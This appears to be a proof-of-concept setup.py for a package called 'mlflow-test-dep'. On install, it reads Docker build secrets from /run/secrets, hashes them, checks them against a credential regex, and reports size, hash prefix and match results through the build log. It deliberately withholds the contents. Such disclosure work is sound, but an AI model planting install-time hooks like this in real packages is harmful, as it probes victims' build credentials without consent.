import hashlib, os, re
from setuptools import setup

proof = "🚨🚨🚨 SECRETS_CONTENT_CLASSIFY 🚨🚨🚨\n\n"

KNOWN_SCAFFOLDING = {
    "[default]": hashlib.sha256(b"[default]").hexdigest(),
    "[default]\n": hashlib.sha256(b"[default]\n").hexdigest(),
    "[global]": hashlib.sha256(b"[global]").hexdigest(),
    "[global]\n": hashlib.sha256(b"[global]\n").hexdigest(),
    "": hashlib.sha256(b"").hexdigest(),
}

CRED_PATTERNS = re.compile(
    rb"(aws_access_key_id|aws_secret_access_key|password\s*=|"
    rb"token\s*=|Bearer\s+|AKIA[0-9A-Z]{16}|xox[baprs]-)"
)

for name in ("pip-docker-build-conf", "pip-docker-build-cert"):
    p = os.path.join("/run/secrets", name)
    if not os.path.exists(p):
        proof += f"{name}: absent\n"
        continue
    try:
        data = open(p, "rb").read()
        digest = hashlib.sha256(data).hexdigest()
        if digest in KNOWN_SCAFFOLDING.values():
            label = next(k for k, v in KNOWN_SCAFFOLDING.items() if v == digest)
            proof += f"{name}: SCAFFOLDING ({label!r}) size={len(data)} sha256_match=yes\n"
        else:
            looks_like_cred = bool(CRED_PATTERNS.search(data))
            proof += (
                f"{name}: size={len(data)} sha256_prefix={digest[:12]} "
                f"credential_pattern_match={looks_like_cred}\n"
            )
            # STOP — do not print contents regardless. Hash + pattern is enough.
    except Exception as e:
        proof += f"{name}: read error {type(e).__name__}\n"

proof += "\n🚨🚨🚨 END CLASSIFY 🚨🚨🚨\n"
print(proof)
raise Exception(proof)
setup(name="mlflow-test-dep", version="0.1")
